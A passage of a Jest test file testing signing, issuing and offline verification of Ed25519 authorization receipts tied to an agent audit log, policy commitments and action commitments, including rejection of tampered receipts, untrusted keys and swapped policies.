import { afterEach, describe, expect, it } from "@jest/globals";
import { createHash, generateKeyPairSync } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { appendChainedAuditEntry, buildEntry, computeCommitment } from "../../src/audit/logger.js";
import {
  cmdReceiptIssue,
  cmdReceiptKeygen,
  cmdReceiptSign,
  cmdReceiptVerify,
  computeIssuerKeyId,
  signAuthorizationReceipt,
  signAuthorizationReceiptV2,
  verifyAuthorizationReceipt,
  verifyAuthorizationReceiptV2,
  verifyReceiptAuditExport,
  verifyReceiptAuditExportV2,
  verifyReceiptPolicy,
  verifyReceiptPolicyV2,
  computePolicyCommitment,
  type AuthorizationReceipt,
  type AuthorizationReceiptV2,
} from "../../src/commands/receipt.js";
import {
  buildAuditExportV2,
  computeAuditExportV2Sha256,
  stableStringify,
  type AuditExport,
  type AuditExportV2,
  type AuditExportV2Body,
} from "../../src/commands/log.js";
import {
  canonicalizeToolAction,
  computeActionCommitment,
  computePolicyCommitment as computeEvidencePolicyCommitment,
} from "../../src/evidence/commitments.js";
import { actionSidecarPath, auditRoot } from "../../src/audit/paths.js";
import { loadPolicy } from "../../src/policy/loader.js";
import type { AuditEntry, AuditEntryV4, CatpPolicy } from "../../src/policy/types.js";
import type { ToolAction } from "../../src/runtime/types.js";

const TEST_HOME = join(tmpdir(), `catp-receipt-command-test-${Date.now()}`);
process.env.CATP_HOME = TEST_HOME;

// ---------------------------------------------------------------------------
// Shared helpers.
// ---------------------------------------------------------------------------

function keyPair(): { privateKeyPem: string; publicKeyPem: string } {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519", {
    privateKeyEncoding: { type: "pkcs8", format: "pem" },
    publicKeyEncoding: { type: "spki", format: "pem" },
  });
  return { privateKeyPem: privateKey, publicKeyPem: publicKey };
}

async function capture<T>(fn: () => T | Promise<T>): Promise<{ output: string; result: T }> {
  const writes: string[] = [];
  const original = process.stdout.write;
  process.stdout.write = ((chunk: string | Uint8Array) => {
    writes.push(String(chunk));
    return true;
  }) as typeof process.stdout.write;
  try {
    const result = await fn();
    return { output: writes.join(""), result };
  } finally {
    process.stdout.write = original;
  }
}

function captureSync<T>(fn: () => T): { output: string; result: T } {
  const writes: string[] = [];
  const original = process.stdout.write;
  process.stdout.write = ((chunk: string | Uint8Array) => {
    writes.push(String(chunk));
    return true;
  }) as typeof process.stdout.write;
  try {
    const result = fn();
    return { output: writes.join(""), result };
  } finally {
    process.stdout.write = original;
  }
}

function makeAction(tool: string, toolInput: Record<string, unknown> = {}, phase: "pre" | "post" = "pre"): ToolAction {
  return { runtime: "test-runtime", phase, toolName: tool, toolInput };
}

const POLICY_A: CatpPolicy = { agent: { id: "receipt-agent", version: "1" }, rules: [{ tool: "Bash", allow: true }] };
const DEFAULT_POLICY_COMMITMENT = computeEvidencePolicyCommitment(POLICY_A);

const RULES_A = '[[rules]]\ntool = "Bash"\nallow = true';
const RULES_B = '[[rules]]\ntool = "Write"\nallow = false';

function writePolicyFile(dir: string, name: string, agentId: string, rulesToml: string): string {
  mkdirSync(dir, { recursive: true });
  const path = join(dir, name);
  writeFileSync(path, `[agent]\nid = "${agentId}"\nversion = "1"\n\n${rulesToml}\n`, "utf8");
  return path;
}

// Locate the daily audit directory from the filesystem rather than re-deriving
// it from the current time, so helpers cannot flake across a UTC midnight.
function latestAuditDate(agentId: string): string {
  const dates = readdirSync(auditRoot(agentId)).sort();
  return dates[dates.length - 1];
}

function sidecarFor(agentId: string, entry: AuditEntryV4): string {
  return actionSidecarPath(agentId, latestAuditDate(agentId), entry.action_commitment);
}

// Append a real v4 entry through the durable logger so both the daily chain and
// the content-addressed action sidecar land on disk exactly as the pre-hook
// writes them. `policyCommitment` is the enforcement-time binding baked into
// the entry; a receipt must copy it verbatim.
function seedV4(
  agentId: string,
  tool: string,
  toolInput: Record<string, unknown> = {},
  opts: { decision?: "allow" | "deny"; phase?: "pre" | "post"; ruleMatched?: string | null; reason?: string; policyCommitment?: string } = {},
): AuditEntryV4 {
  const input = makeAction(tool, toolInput, opts.phase ?? "pre");
  const action = canonicalizeToolAction(input);
  const decision = opts.decision ?? "allow";
  const result = appendChainedAuditEntry(agentId, (prev) => ({
    auditEntry: buildEntry(input, decision, opts.ruleMatched ?? null, prev, {
      reason: opts.reason ?? "receipt-v2-reason",
      policyCommitment: opts.policyCommitment ?? DEFAULT_POLICY_COMMITMENT,
      actionCommitment: computeActionCommitment(action),
    }),
    action,
  }));
  return result.auditEntry;
}

// ---------------------------------------------------------------------------
// Legacy version-1 helpers. v1 receipts keep their historical semantics and are
// labelled `legacy`; they never claim an enforcement-time action binding.
// ---------------------------------------------------------------------------

function auditExport(): AuditExport {
  const ts = "2026-01-01T00:00:00.000Z";
  const inputSummary = '{"command":"ls"}';
  const entry = {
    ts,
    tool: "Bash",
    decision: "allow" as const,
    rule_matched: null,
    commitment: computeCommitment("Bash", "allow", ts, "0", null, inputSummary),
    input_summary: inputSummary,
  };
  return auditExportFrom(entry);
}

function auditExportFrom(entry: AuditEntry, entryIndex = 0, agentId = "receipt-agent", logDate = "2026-01-01"): AuditExport {
  return {
    exportVersion: "catp_audit_export_v1",
    agentId,
    logDate,
    entryIndex,
    commitment: entry.commitment,
    entrySha256: createHash("sha256").update(stableStringify(entry)).digest("hex"),
    entry,
  };
}

function auditEntry(
  tool: string,
  decision: "allow" | "deny",
  ts: string,
  previousCommitment: string,
  inputSummary: string,
  ruleMatched: string | null = null
): AuditEntry {
  return {
    ts,
    tool,
    decision,
    rule_matched: ruleMatched,
    commitment: computeCommitment(tool, decision, ts, previousCommitment, ruleMatched, inputSummary),
    input_summary: inputSummary,
  };
}

describe("authorization receipt", () => {
  afterEach(() => {
    if (existsSync(TEST_HOME)) {
      rmSync(TEST_HOME, { recursive: true, force: true });
    }
  });

  // -------------------------------------------------------------------------
  // Legacy version-1 receipts: still verifiable under historical semantics.
  // -------------------------------------------------------------------------

  it("signs and verifies a legacy v1 CATP audit export", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
    });

    expect(receipt.receiptVersion).toBe("catp_authorization_receipt_v1");
    expect(receipt.signatureAlgorithm).toBe("Ed25519");
    expect(receipt.auditCommitment).toBe(auditExport().commitment);
    expect(receipt.signature).toEqual(expect.any(String));
    expect(() => verifyAuthorizationReceipt(receipt, publicKeyPem)).not.toThrow();
  });

  it("rejects a tampered legacy v1 receipt payload", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
    });
    const tampered: AuthorizationReceipt = { ...receipt, decision: "deny" };

    expect(() => verifyAuthorizationReceipt(tampered, publicKeyPem)).toThrow("signature is invalid");
  });

  it("rejects legacy v1 verification with the wrong public key", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const wrongKey = keyPair();
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
    });

    expect(() => verifyAuthorizationReceipt(receipt, wrongKey.publicKeyPem)).toThrow("signature is invalid");
  });

  it("checks that a legacy v1 receipt matches its audit export", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const exportedAudit = auditExport();
    const receipt = signAuthorizationReceipt(exportedAudit, privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
    });

    expect(() => verifyReceiptAuditExport(receipt, exportedAudit)).not.toThrow();
  });

  it("binds and verifies a legacy v1 policy commitment", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const signedPolicy = POLICY_A;
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
      policyCommitment: computePolicyCommitment(signedPolicy),
    });

    expect(receipt.policyCommitment).toBe(computePolicyCommitment(signedPolicy));
    expect(() => verifyAuthorizationReceipt(receipt, publicKeyPem)).not.toThrow();
    expect(() => verifyReceiptPolicy(receipt, signedPolicy)).not.toThrow();
  });

  it("rejects a legacy v1 receipt policy mismatch", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const signedPolicy = POLICY_A;
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
      policyCommitment: computePolicyCommitment(signedPolicy),
    });
    const differentPolicy: CatpPolicy = { ...signedPolicy, rules: [{ tool: "Write", allow: false }] };

    expect(() => verifyReceiptPolicy(receipt, differentPolicy)).toThrow("policyCommitment does not match");
  });

  it("generates receipt signing keys", () => {
    const dir = join(TEST_HOME, "keygen");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");

    const { output } = captureSync(() => cmdReceiptKeygen({ privateKey: privateKeyPath, publicKey: publicKeyPath }));
    void output;

    expect(readFileSync(privateKeyPath, "utf8")).toContain("PRIVATE KEY");
    expect(readFileSync(publicKeyPath, "utf8")).toContain("PUBLIC KEY");
  });

  it("verifies a legacy v1 receipt through the CLI and labels it legacy", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const signedPolicy = POLICY_A;
    const exportedAudit = auditExport();
    const receipt = signAuthorizationReceipt(exportedAudit, privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
      policyCommitment: computePolicyCommitment(signedPolicy),
    });

    const dir = join(TEST_HOME, "verify-legacy-json");
    mkdirSync(dir, { recursive: true });
    const receiptPath = join(dir, "receipt.json");
    const publicKeyPath = join(dir, "public.pem");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(receiptPath, stableStringify(receipt, 2) + "\n", "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");
    writeFileSync(auditExportPath, stableStringify(exportedAudit, 2) + "\n", "utf8");

    const { output } = captureSync(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath, json: true }),
    );
    const summary = JSON.parse(output) as Record<string, unknown>;

    expect(summary.authorizationReceipt).toBe("valid");
    expect(summary.receiptVersion).toBe("catp_authorization_receipt_v1");
    expect(summary.assurance).toBe("legacy");
    expect(summary.actionCommitment).toBeNull();
    expect(summary.auditExport).toBe("matched");
    expect(summary.auditCommitment).toBe(exportedAudit.commitment);
  });

  it("writes a legacy v1 text verification summary", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const exportedAudit = auditExport();
    const receipt = signAuthorizationReceipt(exportedAudit, privateKeyPem, publicKeyPem, {
      signedAt: "2026-01-01T00:00:01.000Z",
    });
    const dir = join(TEST_HOME, "verify-legacy-text");
    mkdirSync(dir, { recursive: true });
    const receiptPath = join(dir, "receipt.json");
    const publicKeyPath = join(dir, "public.pem");
    writeFileSync(receiptPath, stableStringify(receipt, 2) + "\n", "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    const { output } = captureSync(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath }));

    expect(output).toContain("authorizationReceipt=valid");
    expect(output).toContain("assurance=legacy");
    expect(output).toContain(`auditCommitment=${receipt.auditCommitment}`);
    expect(output).toContain("policyCommitment=none");
  });

  it("requires an external public key when verifying a legacy v1 receipt", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const receipt = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem);
    const dir = join(TEST_HOME, "verify-legacy-without-key");
    mkdirSync(dir, { recursive: true });
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(receiptPath, stableStringify(receipt, 2) + "\n", "utf8");

    expect(() => cmdReceiptVerify({ receipt: receiptPath })).toThrow("missing --public-key <path>");
  });

  it("produces stable legacy v1 receipt JSON for the same payload", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const first = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, { signedAt: "2026-01-01T00:00:01.000Z" });
    const second = signAuthorizationReceipt(auditExport(), privateKeyPem, publicKeyPem, { signedAt: "2026-01-01T00:00:01.000Z" });

    expect(stableStringify(first)).toBe(stableStringify(second));
  });

  // -------------------------------------------------------------------------
  // Version-2 receipts: issued only from recorded enforcement-time bindings.
  // -------------------------------------------------------------------------

  it("signs and offline-verifies a v2 receipt from a self-contained export", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);

    const receipt = signAuthorizationReceiptV2(exported, privateKeyPem, { signedAt: "2026-01-01T00:00:01.000Z" });

    expect(receipt.receipt_version).toBe("catp_authorization_receipt_v2");
    expect(receipt.signature_algorithm).toBe("Ed25519");
    expect(receipt.issuer_key_id).toBe(computeIssuerKeyId(publicKeyPem));
    expect(receipt.phase).toBe("pre");
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(() => verifyReceiptAuditExportV2(receipt, exported)).not.toThrow();
  });

  it("copies policy and action commitments verbatim from the enforcement-time entry", () => {
    const { privateKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" }, { policyCommitment: DEFAULT_POLICY_COMMITMENT });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);

    const receipt = signAuthorizationReceiptV2(exported, privateKeyPem);

    expect(receipt.policy_commitment).toBe(entry.policy_commitment);
    expect(receipt.action_commitment).toBe(entry.action_commitment);
    expect(receipt.audit_commitment).toBe(entry.commitment);
    expect(receipt.audit_export_sha256).toBe(exported.export_sha256);
    expect(receipt.action_commitment).toBe(computeActionCommitment(exported.action));
  });

  it("rejects a v2 receipt verified against an untrusted public key", () => {
    const signer = keyPair();
    const attacker = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const receipt = signAuthorizationReceiptV2(exported, signer.privateKeyPem);

    expect(() => verifyAuthorizationReceiptV2(receipt, attacker.publicKeyPem)).toThrow(
      "issuer_key_id does not match the trusted public key",
    );
    expect(() => verifyAuthorizationReceiptV2(receipt, signer.publicKeyPem)).not.toThrow();
  });

  it("rejects a tampered v2 receipt body", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const receipt = signAuthorizationReceiptV2(exported, privateKeyPem);
    const tampered: AuthorizationReceiptV2 = { ...receipt, decision: "deny" };

    expect(() => verifyAuthorizationReceiptV2(tampered, publicKeyPem)).toThrow("receipt_sha256 does not match");
  });

  it("signs a v2 audit export from files and writes a receipt file", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const dir = join(TEST_HOME, "sign-v2-file");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const auditExportPath = join(dir, "audit-export.json");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(auditExportPath, stableStringify(exported, 2) + "\n", "utf8");

    const { output } = captureSync(() =>
      cmdReceiptSign({ auditExport: auditExportPath, privateKey: privateKeyPath, out: receiptPath }),
    );

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(receipt.receipt_version).toBe("catp_authorization_receipt_v2");
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(output).toContain(`Wrote authorization receipt to ${receiptPath}`);
    expect(output).toContain(`auditCommitment=${entry.commitment}`);
    expect(output).toContain(`policyCommitment=${entry.policy_commitment}`);
    expect(output).toContain(`actionCommitment=${entry.action_commitment}`);
    expect(output).toContain("selectedTool=Bash");
  });

  it("rejects signing a v2 export whose selected entry is a post-action record", () => {
    const { privateKeyPem } = keyPair();
    const post = seedV4("receipt-agent", "Bash", { command: "echo ok" }, { phase: "post" });
    const exported = buildAuditExportV2("receipt-agent", post.commitment);
    const dir = join(TEST_HOME, "sign-v2-post");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(auditExportPath, stableStringify(exported, 2) + "\n", "utf8");

    expect(() => cmdReceiptSign({ auditExport: auditExportPath, privateKey: privateKeyPath })).toThrow(
      "pre-enforcement audit entry",
    );
  });

  it("rejects signing with a --file policy that does not match the enforcement-time commitment", () => {
    const { privateKeyPem } = keyPair();
    const dir = join(TEST_HOME, "sign-v2-policy-swap");
    const pathA = writePolicyFile(dir, "policy-a.toml", "receipt-agent", RULES_A);
    const pathB = writePolicyFile(dir, "policy-b.toml", "receipt-agent", RULES_B);
    const commitmentA = computeEvidencePolicyCommitment(loadPolicy(pathA));
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" }, { policyCommitment: commitmentA });
    const exported = buildAuditExportV2("receipt-agent", entry.commitment);
    const privateKeyPath = join(dir, "private.pem");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(auditExportPath, stableStringify(exported, 2) + "\n", "utf8");

    expect(() => cmdReceiptSign({ auditExport: auditExportPath, privateKey: privateKeyPath, file: pathB })).toThrow(
      "does not match the enforcement-time policy_commitment",
    );
    expect(() => captureSync(() => cmdReceiptSign({ auditExport: auditExportPath, privateKey: privateKeyPath, file: pathA }))).not.toThrow();
  });

  it("rejects missing receipt sign inputs", () => {
    expect(() => cmdReceiptSign({ privateKey: "private.pem" })).toThrow("missing --audit-export");
    expect(() => cmdReceiptSign({ auditExport: "audit-export.json" })).toThrow("missing --private-key");
  });

  it("issues a v2 receipt directly from an audit commitment", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "issue-v2");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const receiptPath = join(dir, "receipt.json");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    const { output } = await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
        auditExportOut: auditExportPath,
      }),
    );

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    const issuedExport = JSON.parse(readFileSync(auditExportPath, "utf8")) as AuditExportV2;
    expect(receipt.receipt_version).toBe("catp_authorization_receipt_v2");
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(() => verifyReceiptAuditExportV2(receipt, issuedExport)).not.toThrow();
    expect(output).toContain(`Wrote authorization receipt to ${receiptPath}`);
    expect(output).toContain(`Wrote audit export to ${auditExportPath}`);
    expect(output).toContain("selectedTool=Bash");
    expect(output).toContain("selectedDecision=allow");
    expect(output).toContain(`selectedTimestamp=${entry.ts}`);
    expect(output).toContain('selectedInputSummary={"command":"ls"}');
  });

  it("issues a v2 receipt to stdout bound to the enforcement-time policy commitment", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" }, { policyCommitment: DEFAULT_POLICY_COMMITMENT });
    const dir = join(TEST_HOME, "issue-v2-stdout");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    const { output } = await capture(() =>
      cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath }),
    );

    const receipt = JSON.parse(output) as AuthorizationReceiptV2;
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    // The binding is copied from the entry, never re-derived from a policy file.
    expect(receipt.policy_commitment).toBe(DEFAULT_POLICY_COMMITMENT);
    expect(receipt.action_commitment).toBe(entry.action_commitment);
  });

  it("keeps a receipt bound to policy A after the policy file is swapped to B", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const dir = join(TEST_HOME, "policy-swap");
    const pathA = writePolicyFile(dir, "policy-a.toml", "receipt-agent", RULES_A);
    const pathB = writePolicyFile(dir, "policy-b.toml", "receipt-agent", RULES_B);
    const commitmentA = computeEvidencePolicyCommitment(loadPolicy(pathA));
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" }, { policyCommitment: commitmentA });
    const privateKeyPath = join(dir, "private.pem");
    const publicKeyPath = join(dir, "public.pem");
    const receiptPath = join(dir, "receipt.json");
    const auditExportPath = join(dir, "audit-export.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");
    writeFileSync(publicKeyPath, publicKeyPem, "utf8");

    // Issue without --file: the receipt binds to the enforcement-time A.
    await capture(() =>
      cmdReceiptIssue({
        agent: "receipt-agent",
        commitment: entry.commitment,
        privateKey: privateKeyPath,
        out: receiptPath,
        auditExportOut: auditExportPath,
      }),
    );
    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(receipt.policy_commitment).toBe(commitmentA);

    // Re-issuing against the swapped policy B must fail; A still succeeds.
    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, privateKey: privateKeyPath, file: pathB }),
    ).rejects.toThrow("does not match the enforcement-time policy_commitment");

    // Offline verification accepts --file A and rejects --file B. A v2 receipt
    // always requires its export, so the swapped-policy check runs with the
    // genuine export attached and must fail on the policy commitment.
    expect(() =>
      captureSync(() => cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath, file: pathA })),
    ).not.toThrow();
    expect(() =>
      cmdReceiptVerify({ receipt: receiptPath, publicKey: publicKeyPath, auditExport: auditExportPath, file: pathB }),
    ).toThrow("policy_commitment does not match");
  });

  it("binds distinct receipts for actions that share a 200-character displayed prefix", () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const inputA = { command: "A".repeat(250) };
    const inputB = { command: "A".repeat(249) + "B" };
    const entryA = seedV4("prefix-agent", "Bash", inputA);
    const entryB = seedV4("prefix-agent", "Bash", inputB);

    // The displayed summaries are identical, but the full actions differ.
    expect(entryA.input_summary).toBe(entryB.input_summary);
    expect(entryA.input_summary.endsWith("…")).toBe(true);
    expect(entryA.action_commitment).not.toBe(entryB.action_commitment);

    const exportA = buildAuditExportV2("prefix-agent", entryA.commitment);
    const exportB = buildAuditExportV2("prefix-agent", entryB.commitment);
    const receiptA = signAuthorizationReceiptV2(exportA, privateKeyPem);
    const receiptB = signAuthorizationReceiptV2(exportB, privateKeyPem);

    expect(receiptA.action_commitment).not.toBe(receiptB.action_commitment);
    expect(receiptA.receipt_sha256).not.toBe(receiptB.receipt_sha256);
    expect(() => verifyAuthorizationReceiptV2(receiptA, publicKeyPem)).not.toThrow();
    // Each receipt rejects the other's export.
    expect(() => verifyReceiptAuditExportV2(receiptA, exportB)).toThrow("audit_export_sha256 does not match");
    expect(() => verifyReceiptAuditExportV2(receiptB, exportA)).toThrow("audit_export_sha256 does not match");
  });

  it("rejects invalid receipt issue inputs", async () => {
    const { privateKeyPem } = keyPair();
    const dir = join(TEST_HOME, "invalid-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(cmdReceiptIssue({ privateKey: privateKeyPath })).rejects.toThrow("missing --commitment");
    await expect(cmdReceiptIssue({ latest: true })).rejects.toThrow("missing --private-key");
    await expect(
      cmdReceiptIssue({ latest: true, privateKey: privateKeyPath, decision: "block" as unknown as "allow" }),
    ).rejects.toThrow("--decision must be allow or deny");
    await expect(cmdReceiptIssue({ latest: true, tool: "Bash", privateKey: privateKeyPath })).rejects.toThrow("use only one of");
    await expect(cmdReceiptIssue({ latest: true, privateKey: privateKeyPath })).rejects.toThrow("missing --agent");
  });

  it("issues a receipt for the latest audit entry", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const first = seedV4("receipt-agent", "Bash", { command: "ls" });
    const second = seedV4("receipt-agent", "Write", { file: "README.md" });
    const dir = join(TEST_HOME, "latest-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", latest: true, privateKey: privateKeyPath, out: receiptPath }));

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(receipt.audit_commitment).toBe(second.commitment);
    expect(receipt.tool).toBe("Write");
    void first;
  });

  it("issues the latest pre-enforcement decision instead of a post-action record", async () => {
    const { privateKeyPem } = keyPair();
    const pre = seedV4("receipt-agent", "Bash", { command: "echo ok" }, { ruleMatched: "Bash:allow" });
    const post = seedV4("receipt-agent", "Bash", { command: "echo ok" }, { phase: "post" });
    const dir = join(TEST_HOME, "latest-pre-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", latest: true, privateKey: privateKeyPath, out: receiptPath }));

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(receipt.audit_commitment).toBe(pre.commitment);
    expect(receipt.audit_commitment).not.toBe(post.commitment);
  });

  it("rejects issuing a receipt for an explicit post-action commitment", async () => {
    const { privateKeyPem } = keyPair();
    seedV4("receipt-agent", "Bash", { command: "echo ok" }, { ruleMatched: "Bash:allow" });
    const post = seedV4("receipt-agent", "Bash", { command: "echo ok" }, { phase: "post" });
    const dir = join(TEST_HOME, "explicit-post-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: post.commitment, privateKey: privateKeyPath }),
    ).rejects.toThrow("pre-enforcement audit entry");
  });

  it("issues a receipt for the latest audit entry matching a tool", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    const bash = seedV4("receipt-agent", "Bash", { command: "ls" });
    seedV4("receipt-agent", "Write", { file: "README.md" });
    const dir = join(TEST_HOME, "tool-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await capture(() => cmdReceiptIssue({ agent: "receipt-agent", tool: "Bash", privateKey: privateKeyPath, out: receiptPath }));

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(receipt.audit_commitment).toBe(bash.commitment);
    expect(receipt.tool).toBe("Bash");
  });

  it("issues a receipt for the latest audit entry matching a decision", async () => {
    const { privateKeyPem, publicKeyPem } = keyPair();
    seedV4("receipt-agent", "Bash", { command: "ls" });
    const denied = seedV4("receipt-agent", "Write", { file: "README.md" }, { decision: "deny", ruleMatched: "deny-write" });
    const dir = join(TEST_HOME, "decision-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    const receiptPath = join(dir, "receipt.json");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await capture(() =>
      cmdReceiptIssue({ agent: "receipt-agent", latest: true, decision: "deny", privateKey: privateKeyPath, out: receiptPath }),
    );

    const receipt = JSON.parse(readFileSync(receiptPath, "utf8")) as AuthorizationReceiptV2;
    expect(() => verifyAuthorizationReceiptV2(receipt, publicKeyPem)).not.toThrow();
    expect(receipt.audit_commitment).toBe(denied.commitment);
    expect(receipt.decision).toBe("deny");
  });

  it("rejects a receipt tool selector with no matching audit entry", async () => {
    const { privateKeyPem } = keyPair();
    seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "missing-tool-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(cmdReceiptIssue({ agent: "receipt-agent", tool: "Write", privateKey: privateKeyPath })).rejects.toThrow(
      'No audit log entry found for agent "receipt-agent" and tool "Write"',
    );
  });

  it("rejects a decision filter with an explicit commitment", async () => {
    const { privateKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    const dir = join(TEST_HOME, "commitment-decision-issue");
    mkdirSync(dir, { recursive: true });
    const privateKeyPath = join(dir, "private.pem");
    writeFileSync(privateKeyPath, privateKeyPem, "utf8");

    await expect(
      cmdReceiptIssue({ agent: "receipt-agent", commitment: entry.commitment, decision: "allow", privateKey: privateKeyPath }),
    ).rejects.toThrow("--decision can only be used with --latest or --tool");
  });

  it("refuses to issue a receipt when the action sidecar is missing", async () => {
    const { privateKeyPem } = keyPair();
    const entry = seedV4("receipt-agent", "Bash", { command: "ls" });
    rmSync(sidecarFor("receipt-agent", entry), { force: true });
    const dir = join(TEST_HOME, "missing-sidecar-issue");
    mkdirSync(dir, { recursive: true });
